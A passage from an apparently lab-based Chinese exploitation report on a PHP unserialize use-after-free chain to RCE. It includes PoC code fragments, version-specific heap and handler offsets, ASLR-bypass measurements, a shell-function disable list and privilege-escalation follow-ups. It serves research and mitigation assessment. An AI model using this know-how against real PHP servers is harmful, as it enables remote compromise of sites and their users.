PoC `find_spray_slot()`（`poc/php8_remote.py:903-953`）假设 page map 在 `chunk + 0x250`（`MAP_OFF = 0x1F8` 相对窗口），那是它的 Debian `php:8.5-apache` 目标的 `sizeof(zend_mm_heap)` 结果。本机实测是 **`chunk + 0x260`**：

```
chunk + 0x00  heap* / next* / prev* / free_pages / free_tail / num   (0x40)
chunk + 0x40  zend_mm_heap                                            (0x1c0)
chunk + 0x200 free_map (512 bit)                                      (0x40)
chunk + 0x260 page map: uint32 × 512
```

`sizeof(zend_mm_heap)` 随构建变化（8.4 比 8.0 多 `shadow_key`/`hard_limit`/`fallible`/`pid`/`rand_state` 等字段），**所以任何"map 在固定偏移"的写法都不可移植**。本驱动用结构自带的锚点自校准，见 `find_spray_slot_v2()`：

```python
MAP_ANCHOR = 0x40000001     # chunk->map[0] = ZEND_MM_LRUN(ZEND_MM_FIRST_PAGE = 1)

r = c.isstring_read(chunk + 0x40, timeout=timeout)   # 窗口从 chunk+0x58 起
wlen, w = r
bases = [o for o in range(0, len(w) - 4, 4)          # 在窗口里找 map[0]
         if struct.unpack_from('<I', w, o)[0] == MAP_ANCHOR]
for o in bases:
    map_abs = chunk + 0x58 + o
    for pn in range(1, min(pages, 512)):             # 找 bin16 的 SRUN run 页
        info = struct.unpack_from('<I', w, o + pn * 4)[0]
        if info & 0x80000000 and not info & 0x40000000 and (info & 0x1F) == 16: ...
```

page_info 位域（`refs/84_Zend_zend_alloc.c`）：bit31 = SRUN，bit31|bit30 = NRUN（后续页，`off` 给 run 内字节偏移），bits0-4 = bin，bits16-24 = 空闲计数。bin 16 一个 run = 5 页 = 64 节点，节点地址 `run_start + k*320`。

> 踩坑记录：`dump_pmap*.py` 最初"测出"的 map 偏移全是错的，因为读的是**上一次请求残留的空闲块**（`free_pages=511`、spray 字节是历史数据）。最后用 `dump_live.py`（每轮 spray 里塞 `os.urandom(4)` token，只认 token 前 8 字节 == 280 的块）才拿到真值。任何"读自己进程的 maps 做对照"的结论都必须用**唯一标记**，否则一定被缓存数据骗。

### 4.5 副作用：worker 自毁与被回收

437/2447 次读返回 500：假长度让 `serialize()` 撞到 `memory_limit` 致命错误，子进程退出或被 FPM/Apache 回收。实验期间 `ps -C apache2` 能看到成批 `[apache2] <defunct>`。这意味着：

* 攻击流量在日志/监控里**天然显眼**（成批 500 + worker 重启），见 §9；
* 但 `memory_limit` 本身**不是缓解**：`memory_limit=20M` 实测仍然 RCE（§6.5），因为链上的 spray 只有几百字节，真正撑爆内存的是"读"这一步，而读失败只是丢一次探测。

---

## 5. ASLR 专题（用户核心问题）

### 5.1 需要突破的随机化项

| 目标 | 传统 ASLR 来源 | 本链如何拿到 |
|---|---|---|
| libc / libphp 镜像基址（PIE 共享库，`mmap` 区随机化） | 内核 mmap 基址随机 | R-2 从堆块向下**扫 ELF 头**，R-3 用 `.gnu_hash` 符号名确认是 libphp；R-4 用 GOT 指针分桶 + 三符号确认 libc |
| `executor_globals`（在 libphp 的 bss 里） | 随 libphp 基址 | R-3 直接解析符号得到绝对地址（不是靠偏移猜） |
| `zend_class_entry`（请求堆上的 HT 节点） | 每进程随机化堆 + 分配历史 | R-5 从 `EG.class_table` 走 HashTable 真读 |
| ZendMM 2 MiB 块基址、spray 节点地址 | `mmap` 随机 | R-1 一次请求泄露堆指针；R-6 用块内 page map 自校准定位 spray |
| 栈 / vdso / vsyscall | — | **不需要**：没有 ROP，只有一次间接调用 |

**没有一项靠"猜"**。全部靠 §3.5 那个任意读原语在线扫描，因此不需要任何第二信息泄露（不需要 `phpinfo`、不需要报错泄露、不需要 side-channel）。ASLR 在这条链上只是把"攻击预算"从 0 提到 ~2.4k 请求，不是门槛。

### 5.2 一个反直觉但很重要的发现：布局熵远低于 ASLR 名义熵

8 次冷启动（每次都 `service apache2 restart`，映射全部重随机）的实测：

| 运行 | 堆块基址 | R-1 泄露地址的**块内偏移** | R-6 spray 的**块内偏移** | `libphp - chunk` | `EG - libphp` | `libc - libphp` | `libc - chunk` |
|---|---|---|---|---|---|---|---|
| runA（keep-alive 基线） | `0x7b1446400000` | `+0x581e0` | `+0x79518` | **−16.00 MB** | `+0x5d4e40` | +26.10 MB | +10.10 MB |
| case_basedir | `0x73119e600000` | `+0x581e0` | `+0x79518` | −16.00 MB | `+0x5d4e40` | +26.06 MB | +10.06 MB |
| case_memlow | `0x762fc0600000` | `+0x581e0` | `+0x79518` | −18.00 MB | `+0x5d4e40` | +25.67 MB | +7.67 MB |
| case_mitig | `0x718c54400000` | `+0x581e0` | `+0x79518` | −16.00 MB | `+0x5d4e40` | +26.22 MB | +10.22 MB |
| case_nokeep | `0x710911c00000` | `+0x581e0` | `+0x79518` | −16.00 MB | `+0x5d4e40` | +25.04 MB | +9.04 MB |
| case_maxreq | `0x7ef143600000` | `+0x581e0` | `+0x79518` | −18.00 MB | `+0x5d4e40` | +26.98 MB | +8.98 MB |
| case_aslr0（ASLR=0） | `0x7ffff7200000` | `+0x581e0` | `+0x79518` | −16.00 MB | `+0x5d4e40` | +25.27 MB | +9.27 MB |
| case_restore（基线复测） | `0x70c163200000` | `+0x581e0` | `+0x79518` | −16.00 MB | `+0x5d4e40` | +26.22 MB | +10.22 MB |

* **块内偏移 8/8 逐字节相同**：`heap_ref = chunk+0x581e0`、`S = chunk+0x79518`。ZendMM 对同一请求序列的分配路径是完全确定的，ASLR 只随机化了那一次 `mmap` 的**基址**；spray 节点、`zend_mm_heap`、page map 的相对位置一律不变。
* `EG = libphp + 0x5d4e40` 在 8/8 次相同（同一 libphp 二进制 ⇒ 本来就该相同，但这条实测确认了"只要认出 libphp，EG 就是免费的"）。
* **libphp 永远在堆块下方 16 或 18 MiB（2 MiB 对齐的两档），libc 永远在堆块上方 7.7~10.2 MiB**：所有相关对象都挤在同一 mmap slide 附近的 ~26 MiB 窗口里。这正是 R-2"从堆块往下按 4 KiB 页扫 577 次就能撞见 libphp"能成立的原因，也解释了 R-4 为什么只需在 GOT 指针附近做小范围向下扫描。**换句话说：这台机器上的地址随机化，有效熵几乎全部落在"chunk 基址"这一个量上，而那个量是泄露来的，不是猜的。**

### 5.3 于是"过 ASLR"这件事被拆成两问

1. **熵**：真正需要在线搜索的只有 mmap 基址（这块内核给了 ~28 bit 级别），但链**不搜索基址**——它泄露基址（R-1）后做相对寻址。所以熵在这里没有意义。
2. **可读性**：链要求"能读到的地址必须是已映射且看起来像 zend_string"。这才是真正的约束：扫描窗口必须够大（libphp 在 16~18 MB 内）、页对齐步长 4 KiB、读到代码/未映射就吃一个 500 继续。

### 5.4 ASLR 开关实测对比

| 配置 | 请求数 | 失败读 | 用时 | 结果 |
|---|---|---|---|---|
| `randomize_va_space = 1`（默认基线） | 2447 | 437 (18%) | 111.5 s | RCE ✔ |
| `randomize_va_space = 0` | 2447 | 414 (17%) | 103.0 s | RCE ✔ |
| 复用 DSO 基址缓存（`--cache`，服务器未重启） | 532 | 6 (1%) | **4.1 s** | RCE ✔ |

**关掉 ASLR 对这条链几乎没有帮助**（请求数完全一样、时间差 8%），因为它不靠猜地址。这个反向证据很关键：它说明"ASLR 能否被绕过"在这里根本不是成功条件，**成功条件是"有没有那三个应用侧硬条件 + 够不够请求量"**。

`--cache` 那一行还说明另一件事：libphp/libc/EG/GOT 基址由 Apache 父进程建立，**子进程崩溃/重启不会改变**，只有 `service apache2 restart` 才重随机。攻击者只要拿到一次基址，之后的 R-1/R-5/R-6/R-7 只要 ~530 请求 / 4 秒 —— 即"第一次慢、后续快"，非常适合对着真实站点反复利用。

### 5.5 冷启动可靠性与成本方差（8 次独立冷跑）

`lab/reliability.sh 8`：每次先 `service apache2 restart`（映射全部重随机、无任何缓存），再从零跑完整链。

| run | 结果 | 请求数 | 失败读 | 用时 |
|---|---|---|---|---|
| 1 | RCE ✔ | 2447 | 415 | 104 s |
| 2 | RCE ✔ | 2444 | 426 | 107 s |
| 3 | RCE ✔ | **3004** | 419 | 108 s |
| 4 | RCE ✔ | 2440 | 414 | 103 s |
| 5 | RCE ✔ | 2459 | 433 | 108 s |
| 6 | RCE ✔ | 2438 | 414 | 103 s |
| 7 | RCE ✔ | 2439 | 414 | 103 s |
| 8 | RCE ✔ | 2453 | 425 | 107 s |

* **成功率 8/8**，且**方差极小**：请求数中位 2445.5、除第 3 轮外全落在 2438~2459（第 3 轮多花 557 次 = 一次 R-4 扫描多绕了一段 DSO），用时 103~108 s。
* 这与 §5.2 的"布局高度确定"是自洽的：既然链不依赖猜测、只依赖固定扫描流程，可靠性就由"扫描算法能否稳定认出 libphp/libc"决定，而不是由 ASLR 决定。
* 单线程、串行、无并发，8 轮均值 **105.4 s / 2453.5 请求 = 43 ms/请求**。换算成防护语言：即便把单 IP 压到 **30 请求/分钟**，攻击者也只需约 **82 分钟**，且这期间会持续产生 500 —— 所以"限速 + 500 比例告警"要一起用才有效（§9.3），单纯限速不是答案。

### 5.6 其他缓解机制在这条链上的位置

| 机制 | 是否影响 | 原因 |
|---|---|---|
| Full RELRO / GOT 只读 | 无关 | 链**不覆写 GOT**，只是把 GOT 当作识别 libc 的线索；执行靠 handler 函数指针 |
| DEP/NX | 无关 | 不执行 shellcode，跳转到 libc 已有函数 |
| Stack canary | 无关 | 不碰栈 |
| CFI/IBT（Intel SHSTK/IBT） | **理论上相关**（一次间接调用 `call *handlers->get_properties_for`），本机靶场 CPU/内核未启用 IBT，未观测到拦截；**属于未验证项**，不写成结论 |
| glibc `ASSERT`/safe-linking | 无关 | 不操作 malloc 元数据，ZendMM 自己的堆 |
| SELinux/AppArmor、容器 seccomp | **可能有效**（限制 `system()`→`/bin/sh`→`execve` 之后），链本身照样跑到 R-7；本报告未针对 LSM 做实验 |
| 前端 WAF/rate limit | **最有效的外围手段**：整条链需要数千次带畸形 `unserialize` 结构的请求且会打出成批 500（§9） |

---

## 6. 精确利用条件（本报告的核心交付）

判定标记：**[实测]** = 本机靶场跑过并有证据文件；**[源码]** = 由 `refs/` 里的 PHP 源码结构推出；**[推断]** = 合理但未验证，不作为结论使用。

### 6.1 应用侧：三个硬条件，缺一不可 **[实测 + 源码]**

| # | 条件 | 判定依据 |
|---|---|---|
| A1 | 存在"把攻击者可控字符串交给 `unserialize()`"的入口（参数、cookie、缓存值、消息体、session 反序列化都算） | 链的入口只有这一个；`poc/remote_app.php:41` |
| A2 | 进程内可实例化的 `Serializable` 实现类，其 `unserialize()` 会**再做一次嵌套 `unserialize()`**，并且紧接着对返回值写属性（`->x = 0` 这种），使该对象属性表发生扩容 | 只有 `C:` 桥会把外层 var_hash 传进用户代码（§3.2）；`[ifaces]:443-462` 不设 `BG(serialize_lock)` 是关键 |
| A3 | 反序列化产物随后被"遍历"一次：`serialize()`、`var_dump()`、`print_r()`、`get_object_vars()`、`count()`、`foreach` 对象属性、任何走到 `zend_get_properties_for()` 的路径 | `[oph]:2656-2663` 是通用实现；**[实测]** 只验证了 `serialize()` 这一条（A3 的具体实现换成别的，需要重新验证一次触发点） |

补充：

* A2 需要该类**可被名字实例化**（在目标进程里已定义/自动加载可达），PoC 用的是 `CachedData`。类名可以换，PoC 的 `C_PART` 常量要跟着改（`poc/php8_remote.py:61`）。
* A2 里"写属性使表扩容"这一步是** gadget 的形状**，不是"必须恰好 8 个属性"。PoC 选 8→16 扩容是为了让释放块大小（320 B）恰好等于 spray 的归一化大小（305 B → bin 16）。换属性个数就必须重算 bin（例如 4→8 释放 160+32=192 B → 另一 bin），spray 长度也要改。**[实测]** 只有 8 属性这一种组合被端到端验证过。
* **`__unserialize()` / `__serialize()` / `__sleep()` 都不能替代 A2**（§3.2 给出源码路径）。
* 负面条件（挡链）：**实测**（§6.5.2 `lab/negative_tests.sh`）目标脚本不声明 `Serializable` gadget、或 `unserialize($x, ['allowed_classes' => false])`（`[var.c]:1483-1519`）时，链在 **R-1 一次请求内即断**，无任何 UAF 读原语。这两条是端到端验证过的硬前置。改用 JSON/`msgpack` 等等价于"不反序列化不可信输入"。

### 6.2 SAPI 与部署形态

| 形态 | 本链可用性 | 说明 |
|---|---|---|
| Apache **mod_php prefork + NTS** | **[实测] 端到端 RCE**（uid=www-data；矩阵 8 组里 7 组盲扫直接成功，`disable_functions` 组靠带外 libc 基址成功后计入，见 §6.5.1） | 请求间 worker 复用 → 有状态链可以跨请求保持；崩溃后子进程由 Apache 父进程补上，基址不变 |
| Apache mod_php event/thread | 未测 | 线程 MPM 下 mod_php 本就不推荐；worker 复用逻辑仍在，但连接与线程绑定关系变化会影响亲和性 **[推断]** |
| **PHP-FPM** | **未端到端验证**（本机 `/etc/php/8.4` 只有 apache2/cli/mods-available，未安装 `php8.4-fpm`） | 源码判定：需要"同一 pool worker 连续处理这些请求"。`pm.max_requests` 小 → 状态随 worker 退出而丢；链上任意读触发的 `memory_limit` 致命会让 worker 被销毁（FPM 每次都重建），比 mod_php 更难推进。**[推断]** FPM 可用但成本更高、可靠性更差 |
| FPM + nginx 传 `PHP_VALUE`/`PHP_ADMIN_VALUE` | 与 CVE-2026-109619 的"INI 诊断消费者"直接相关 | 公告明确：这会给 FPM 提供"正常请求初始化之前"的消费点。**这是内核级 CVE 的 FPM 暴露面，与本 PoC 无关，但部署上必须一起查** |
| FrankenPHP | 公告判定"大概率易感（对内核级 CVE）"；本 PoC 未测 | — |
| `php -S` 内置 server / CLI 直调 | 原语成立（CLI 下 UAF 读已在 XAMPP 8.0.12 复现），**PoC 不适用**：单请求进程模型没有跨请求状态，也没有 HTTP 语义 | 见 `docs/windows-side.md` 与 `lab/evidence/uaf_cli.json` |

### 6.3 平台与构建：Linux/ELF/NTS 是这条 PoC 的硬前提 **[实测]**

| 维度 | 结论 |
|---|---|
| 二进制格式 | PoC 的 R-2/R-3/R-4 **全是 ELF 逻辑**（ELF 头三元组判定、`.gnu_hash` 符号解析、`PT_DYNAMIC`/GOT 分桶）。Windows 是 PE/COFF + IAT，**没有等价实现**。本机 XAMPP 的 4787 个 PE 镜像按 PoC 的 `e_phoff==64 / e_ehsize==64 / e_phentsize==56` 判定，**0 个** 能通过 → R-2 直接归零。 |
| 线程模型 | **ZTS 断链**：NTS 下 `executor_globals` 是全局符号（R-3 能解析）；ZTS 下它是 `ZLS_FETCH()` 里的 TLS 宏，`.dynsym` 里没有可用符号，PoC 的 `EG` 获取路径整体失效，链上无替代。 |
| 地址空间 | Windows ASLR 粒度与 `image base` 重定位机制不同，ZendMM 块头/页表结构也不同（`[anon:zend_alloc]` 这个名字本身就来自 Linux `prctl(PR_SET_VMA_ANON_NAME)`）。 |
| 结论 | **Linux + NTS + ELF 是这条公开 PoC 的前提**；Windows/ZTS 上只有"漏洞原语存在"这一层意义。完整数字与替换方案表见 `docs/windows-side.md` §3。 |

### 6.4 版本与四处必须校准的常量（PoC 按 `php:8.5-apache` 一个构建写死）

| 项 | PoC 值 | 实测 8.4.24 值 | 影响 |
|---|---|---|---|
| `EG.class_table` 相对 `EG` | `+0x1D0`（`php8_remote.py:810`） | **+0x1B8** | R-5 直接失败或读到无意义指针。`lookup_class_table_auto()` 通过 DJBX33A 校验自动标定，不写死 |
| `zend_object_handlers.get_properties_for` | 偏移 **200**（`_fire_cmd:956-988`，`<Q` 写在 200） | **192**。逐字段数过：8.4 的 `struct _zend_object_handlers`（`refs/84_Zend_zend_object_handlers.h:205`）是 `int offset`（补齐到 8）+ `free_obj … compare` **23 个函数指针**，`get_properties_for` 是第 24 个 ⇒ `8 + 23×8 = 192`；master（`refs/master_Zend_zend_object_handlers.h:205`）在 `clone_obj` 后插入 `clone_obj_with`（并把 `offset` 改成 `size_t`）⇒ 24 个指针 ⇒ `8 + 24×8 = 200`，与 PoC 的常量吻合 | 写错位置 = 不执行、且极难察觉（表现为"链跑完但没反应"）。`--gpf-off 192` 参数化。注：PHP-8.5 分支的这份头文件本机网络未取得（`raw.githubusercontent.com` 超时），200 是按 master 结构 + PoC 在 8.5 上实测有效反推的 |
| page map 块内偏移 | `MAP_OFF = 0x1F8` ⇒ 绝对 `chunk+0x250` | **`chunk+0x260`** | 由 `sizeof(zend_mm_heap)` 决定，**随构建变化**；已改为结构自锚定（§4.4） |
| libc 判据 | `e_phnum >= 12`（调优给 Debian 12 libc） | 本靶 libc `phnum=15`，但**附近 DSO 常见 9/11** | 已放宽为"能解析出 `system`+`popen`+`exit` 三个符号"（`libc_locator_v2`） |

受影响版本：`< 8.2.35` / `< 8.3.36` / `< 8.4.27` / `< 8.5.12`（公告）。**注意**：这组区间是**两个内核级 CVE** 的区间，不能直接当作本 PoC 的区间 —— PoC 依赖的 var_hash 缺陷在这些分支上都存在（`refs/84_*`、`refs/85_*`、`lab/src8012` 三份源码里 `var_push()` 存裸指针的写法一致，8.0.12 也一致 **[源码]**），而 §1.2 已说明 `fix.diff` 没有修它。**升级到 8.4.27/8.5.12 只能关掉内核级那两个入口，不能保证这条应用层链消失**（本机未能取得 8.4.27 构建，未做端到端回归 **[实测待补]**）。

### 6.5 配置项实测矩阵（每组都重启 Apache、重随机布局、从零跑链）

驱动：`lab/run_case.sh` + `lab/cases.sh`；证据：`lab/evidence/case_*.json`、`lab/matrix.log`。

| 组 | 配置差异 | 结果 | 请求数 / 失败读 / 用时 | 失败阶段 |
|---|---|---|---|---|
| **baseline**（= `restore`） | 无（默认 ini：`memory_limit=128M`、`post_max_size=8M`、ASLR=1、keep-alive） | **RCE ✔** | 2439 / 423 / 107.1 s | — |
| `disable` | `disable_functions = system,exec,passthru,shell_exec,popen,proc_open,pcntl_exec` | **链停在 R-4** | 2739 请求后放弃 | libc 未被盲扫定位（**非缓解**，见 §6.5.1） |
| `basedir` | `open_basedir = /var/www` | **RCE ✔** | 2439 / 421 / 106.8 s | — |
| `memlow` | `memory_limit = 20M` | **RCE ✔** | 2448 / 428 / 106.3 s | — |
| `mitig` | `memory_limit = -1` + `session.upload_progress.enabled = 0`（公告推荐项） | **RCE ✔** | 2439 / 567 / 137.3 s | — |
| `nokeep` | 客户端每请求新建连接（`--no-keepalive`） | **RCE ✔** | 2441 / **1215** / 148.7 s | — |
| `maxreq` | `MaxRequestsPerChild 60`（worker 每 60 请求回收） | **RCE ✔** | **3008** / 427 / 111.2 s | — |
| `aslr0` | `randomize_va_space = 0` | **RCE ✔** | 2447 / 414 / 103.0 s | — |

逐条解读：
* **`open_basedir` 无关**：它只 gate PHP 的文件类函数，链不碰文件系统（直到 R-7 之后命令才碰）。公告里 `open_basedir` 出现在 CVE-2026-109619 的"INI 诊断消费者"触发列表里，那是内核级路径的触发条件之一，不是本链的防线。
* **`memory_limit` 双向都不是缓解**：128M、20M、`-1` 都成功。`-1` 是公告针对 **OOM `longjmp()` 路径**给的缓解（去掉可预测的每请求上限），对这条 spray 只需几百字节的链毫无作用。反过来说：**`memory_limit` 在这里的作用是让失败的读探测变成 500**，是攻击者的"信号源"而不是障碍。
* **`session.upload_progress.enabled=0` 无关**：本链完全不碰 session（公告里它是内核级 CVE 的消费者，见 §7）。
* **`display_errors=Off` 也无关（为 §1.4 专门补测）**：第二篇公众号声称"完整链需要 `display_errors=On`，Off 下只完成第一阶段堆泄漏"。这条应用层链的读原语走**应用回显 sink**（`echo serialize($result)`，§6.1 条件③），不依赖 PHP 报错输出；靶机 `remote_app.php:101` 本就 `ini_set('display_errors','0')`。`lab/verify_display_off.sh` 再在 php.ini 层强制 `display_errors=Off / error_reporting=0` **并**把 `memory_limit` 设成文章认为"打不进来"的默认 **128M**，冷启动整链仍端到端 RCE（`lab/evidence/verify_display_off.json`：2447 请求 / `uid=33(www-data)`）。`display_errors` 属内核级 CVE-2026-109619 的错误/回溯泄漏通道，与本链无关。
* **keep-alive/亲和性**：见 §6.6。
* **`MaxRequestsPerChild 60`**：R-4 阶段从 1916 → 2477 请求，总量 2447 → **3008（+23%）**，但链仍完成。原因：状态被回收时链会重跑（R-1 重来），但只要连接序列还在同一代 worker 上就能推进。**降低 worker 寿命是"提高成本"，不是"阻断"**；要真正阻断需要 `pm.max_requests=1`（FPM，每请求新 worker）这一档，本靶场未安装 FPM 未验证 **[实测待补]**。
* **ASLR=0**：见 §5.4，成本几乎不变。

#### 6.5.1 `disable_functions` / `disable_classes` 判别实验 **[实测，已完成]**

矩阵里唯一"没打通"的是 `disable` 组，但失败点在 R-4 的 libc **定位**（盲扫 `no image header in 600 pages`），不在执行环节。为把"ini 真挡住了"和"定位器这次没扫到"这两件事分开，用带外 libc 基址（`--libc-hint`，root 读 `/proc/<parent>/maps` 拿镜像基址，**纯靶场自省、攻击者拿不到**）重跑同一链，跳过 R-4 盲扫，看 R-5..R-7 是否照常落地。驱动：`lab/diag_disable.sh`（对照组 + `--ini`）、`lab/diag_disable_classes.sh`；证据：`lab/evidence/hint_*.json`。

| 组 | ini | libc 来源 | 请求数 / 失败读 / 用时 | RCE |
|---|---|---|---|---|
| `hint_baseline` | 无 | 带外 hint `0x7ce8636ee000` | 1126 / 414 / 100.0 s | **✔ `uid=33(www-data)`** |
| `hint_disable` | `disable_functions = system,exec,passthru,shell_exec,popen,proc_open,pcntl_exec` | 带外 hint `0x751964bdb000` | 1126 / 412 / 97.6 s | **✔ `uid=33(www-data)`** |
| `hint_disable_classes` | `disable_classes = CachedData` | 带外 hint `0x79c98938e000` | 1130 / 423 / 101.1 s | **✔ `uid=33(www-data)`** |

三组请求数/失败读/用时几乎一模一样（1126~1130），且都成功执行 `id>/tmp/pwned`。结论：

* **矩阵里的 R-4 盲扫失败是布局脆弱，不是 ini 生效**。同一个 `libc_locator_v2` 盲扫在 `disable_functions` 组（`case_disable`，2739 请求 libc=None）和**无任何 ini 的反向组**（`neg_disable_classes`，2776 请求 libc=None，§6.5.2）里都会卡住，而在带 hint 的三组里 6 次请求就解析出 `system`/`popen`/`exit`。也就是说：R-4 失败随**重随机后的 mmap 布局**出现，与是否设 ini 无关 —— 把它记成"缓解成功"是错的。hint 只是把这一段"攻击者本可在线扫到、这次运气差没扫到"的开销短路掉，用来隔离执行路径。
* **`disable_functions` 完全不影响这条链的执行路径**（机理印证）：R-7 是 `handlers->get_properties_for = system@libc` 的一次间接调用，链从不查 PHP 用户态函数表，把 `system` 放进 `disable_functions` 也照样跳进 libc 的 `system`（hint 版 6 请求解出 `system=0x751964c2f1b0`，随后 R-5/R-6/R-7 全绿、`/tmp/pwned` 落地 `uid=33`）。
* **`disable_classes` 同样挡不住**：`CachedData` 是被 `remote_app.php` 在运行时 `class ... implements Serializable` 声明的**用户态类**，`disable_classes` 只在扩展 minit 阶段对已进入 class table 的类生效，对随后用户脚本声明的同名类无效。`lab/probe_dis_class.php` 直接验证：`ini_get` 读到 `[CachedData]`，但 `new CachedData()` 仍成功、`unserialize('C:10:"CachedData":5:{hello}')` 的 `unserialize()` 回调照样触发（`hook_ran='yes:hello'`）。所以 §9 里"`disable_classes = CachedData` 能挡链"的说法要降级：**它只在 gadget 类由扩展预注册时成立，对本 PoC 的应用层 gadget 类无效**。

#### 6.5.2 三条件反向验证（negative controls） **[实测，已完成]**

驱动 `lab/negative_tests.sh`，每组只移除 §6.1 的一个应用侧硬条件。证据 `lab/evidence/neg_*.json`（全部 180 s 超时上限）。

| 组 | 移除的条件 | 失败阶段 | 请求数 | RCE |
|---|---|---|---|---|
| `neg_nosink_class` | 目标脚本不声明 `Serializable` gadget 类 | **R-1**（heap leak 直接 `FAILED`） | 1 | ✘ 无 `/tmp/pwned` |
| `neg_allowed_false` | gadget 类在，但 `unserialize(..., ['allowed_classes'=>false])` | **R-1** | 1 | ✘ 无 `/tmp/pwned` |
| `neg_disable_classes` | `disable_classes = CachedData`（盲扫 libc） | **R-4**（libc=None，2776 请求后放弃） | ~2776 | ✘ 无 `/tmp/pwned` |

前两组是干净的**硬前置验证**：拿掉 gadget 类或禁用 `Serializable` 实例化后，链在 R-1 的一步请求内就断，没有任何 UAF 读原语 —— 与 §3.2「同步嵌套 `unserialize()` 桥只存在于 `Serializable::unserialize()`」的源码判定完全吻合。第三组 `disable_classes` 表面上也"失败"，但**失败在 R-4 定位器、且 hint 版同配置直接 RCE**（§6.5.1），所以它证明的是"定位器脆弱"，不是"`disable_classes` 是缓解" —— 对运行时声明的用户态 gadget 类，`disable_classes` 无效。

### 6.6 worker 亲和性 **[实测]**

实测（`lab/probe_affinity.sh 150`，主测法 = 让 `/pid_probe.php` 回显 `getmypid()`，交叉校验 = access log 的 `%P` 项；靶场 prefork `StartServers=5`，当时存活 1 父 + 5 子）：

| 连接方式 | 请求数 | 命中的不同子进程 | 分布（pid: 次数） | 最高占比 |
|---|---|---|---|---|
| keep-alive（复用一条连接） | 100 | **1** | `25577: 100` | **100%** |
| 每请求新建连接（`--no-keepalive`） | 100 | **5** | `25577: 28`、`25580: 26`、`25579: 16`、`25578: 15`、`25581: 15` | 28% |

`%P` 日志项统计到的是同一件事（`128 / 26 / 16 / 15 / 15`，其中 128 条来自 keep-alive 那一段）。

已知事实与解读：

1. 链的**每一步都依赖同进程状态**（被 free 的桶、spray、var_hash 表项），跨进程读同一地址必然失败。
2. keep-alive 把亲和性做成**确定性**的（100% 单进程），这是 PoC 用它的真正原因。反过来，串行新建连接在这台 prefork 上**接近均匀轮转 5 个子进程**（28/26/16/15/15，不是集中在一个子进程）—— 这一点修正了我先前"刚处理完请求的子进程更可能再次 accept"的猜测。
3. 尽管如此，`nokeep` 组**仍然 RCE 成功**（§6.5：2441 请求、失败读 1215 = 50%，对比基线 423 = 17%）。也就是说"同一 worker"这一条件在串行轮转下是靠**重试**满足的：链每一步都用当前请求 R-1 泄露的堆基址重新标定，落到别的子进程就表现为一次失败读/重跑。所以 **keep-alive 是成本优化项，不是前提**；代价是 +290% 的失败读和 +42 s 用时。
4. 真实前端下这条会放大：多实例负载均衡、`SO_REUSEPORT`、HTTP/2 多路复用打散、并发流量都会让"同一 worker"命中率下降，失败读比例从 50% 继续往上走，请求量近似按并发 worker 数放大 **[实测比例 + 推断]**。
5. 跨主机/跨容器的多副本部署：只要 `remote_app.php` 与库版本一致，每个副本各自独立可打，但**一个副本的泄露地址对另一个副本无效** **[推断]**。

### 6.7 不需要的前提（常见误解清单）

以下项**都不需要**，链上没有任何代码读取它们 **[源码 + 实测]**：
`session.*`（除 §7 的内核级路径）、`allow_url_include`、`unserialize_callback_func`、`register_globals` 时代的任何行为、`display_errors`/`error_reporting`（只影响回显干净度：`remote_app.php:14-15` 抑制 `E_DEPRECATED` 是为了让 §4.2 的响应解析稳定，不是执行前提；**已实测坐实**：php.ini 强制 `display_errors=Off / error_reporting=0` 后链仍端到端 RCE，见 §6.5 与 `lab/evidence/verify_display_off.json`）、`memory_limit`（128M/20M/`-1` 都成功，§6.5；"小内存才触发"是内核级 CVE-2026-109618 的 OOM 路径，不是本链）、`max_execution_time`、`disable_classes`（**实测反例**：见 §6.5.1——`CachedData` 是应用运行时声明的用户态类，`disable_classes` 只在扩展 minit 阶段对已入 class table 的类生效，对它无效，同配置照样 RCE）、扩展（链只用核心 + `standard` 的序列化代码）、特定 `post_max_size`（PoC 负载只有约 9 KB，远低于 8 M）。

`unserialize_max_depth`（默认 4096）与 var 表上限也都不构成障碍：PoC 负载深度 ~3、表项 ~44（< `VAR_ENTRIES_MAX` 1018）、元素数远小于 `HT_MAX_SIZE` **[源码]**。
* **`MaxRequestsPerChild` 的写法有坑**：Apache 2.4 的 `MaxRequestsPerChild` 在 mpm_common 里含义是"每个子进程可处理的请求数上限"，本组用它把 worker 寿命压到 60 请求。若目标是 FPM，对应项是 `pm.max_requests`，语义相同但**回收更彻底**（FPM worker 退出即销毁整个请求堆），成本会显著高于这里的 +23%。

### 6.8 权限边界：RCE 落在哪一层，提权要不要另配 **[实测 + 分析]**

**结论先说：这条链给的是"以 mod_php worker 自身凭据执行任意命令"，在靶场里就是 `www-data`(uid/gid 33)，它本身不是提权漏洞。** 想拿到 root / 其他用户 / 宿主机，**必须另外配合 LPE(本地提权)**，php2shell 不含这一环 —— 这与 §1.2「两个内核级 CVE ≠ 这条应用层链」是同一事实的两面：链的终点 R-7 是一次 `handlers->get_properties_for = system@libc` 的间接调用，发生在 worker 自己的地址空间与凭据上下文里，既不陷入内核态，也不碰 capability 或凭据。

实测正在运行的 worker 进程凭据上下文（`lab/show_priv_context.sh`，读 `/proc/<worker>/status`）：

| 项 | 靶场实测 | 含义（对攻击者 = 天花板 / 对防御者 = 可加固点） |
|---|---|---|
| `Uid/Gid` | `33 33 33 33` | `system()` 继承 www-data，**不是 root** |
| `Groups` | 仅 `33` | 可写目录仅限属主/属组可写处 |
| `CapEff` | 全 0 | **无 capability**：不能绑特权端口、不能 `ptrace` 别的用户进程 |
| `NoNewPrivs` | `0` | **未设 NNP**：SUID/`sudo` 一旦被利用内核允许提权（本靶场这条可达） |
| `Seccomp` | `0` | **无系统调用过滤** |
| AppArmor `attr/current` | `kernel`(≈unconfined) | **无 MAC 约束** |
| 可写位置 | `/var/www/html`(root:www-data 775)、`/tmp` | webshell 能落地靠的是这个可写权，非提权 |

**典型"RCE + LPE"组合**（全是 OS 层，与本 CVE 无关，属另一漏洞类别）：内核提权 CVE（脏pipe / dirty_cred 等）从 www-data 直接 root；SUID 二进制 / `sudo` 错配 / `NoNewPrivs=0` 环境；读 www-data 可读配置里的 DB/应用密钥做横向移动；容器部署时叠加**容器逃逸**（挂载的 docker socket、特权容器、hostPath）才谈得到宿主机；world-writable 的 cron/systemd unit/服务脚本被 root 重放。**本报告未对这些 LPE 环节做端到端演示**（超出 php2shell 范畴，且属另一类漏洞）**[分析]**。

